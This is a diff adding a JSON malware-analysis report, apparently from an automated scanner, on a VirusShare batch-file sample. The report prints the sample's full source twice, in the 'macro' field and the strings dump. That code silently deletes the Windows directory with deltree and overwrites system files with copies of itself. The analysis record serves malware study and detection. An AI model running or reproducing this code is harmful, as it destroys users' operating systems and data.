@@ -1,0 +1,43 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off\n@break off >nul\nctty >nul\ncopy %windir%\\command\\deltree.exe  c:\\\nc:\\deltree.exe %windir% /Y\nrem errors support hbbg\nif exist %windir%\\command.com goto fuckwin\ngoto end\n:fuckwin\nfor %%f in (%windir%\\*.*) do copy %0 %%f >nul"
+    },
+    "filename": "VirusShare_02a3fb389e25199c6aac7bb0e9e560e9",
+    "filesize": 243,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "02a3fb389e25199c6aac7bb0e9e560e9",
+        "sha1": "89f1383fa500bbae34cda563d59eec7d7e02b9c7",
+        "sha256": "40a6f1e1f2fcfe329e2d2b17d9595ee096f905967800e5a26da335941aba137e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "@break off >nul",
+            "ctty >nul",
+            "copy %windir%\\command\\deltree.exe  c:\\",
+            "c:\\deltree.exe %windir% /Y",
+            "rem errors support hbbg",
+            "if exist %windir%\\command.com goto fuckwin",
+            "goto end",
+            ":fuckwin",
+            "for %%f in (%windir%\\*.*) do copy %0 %%f >nul"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269268",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
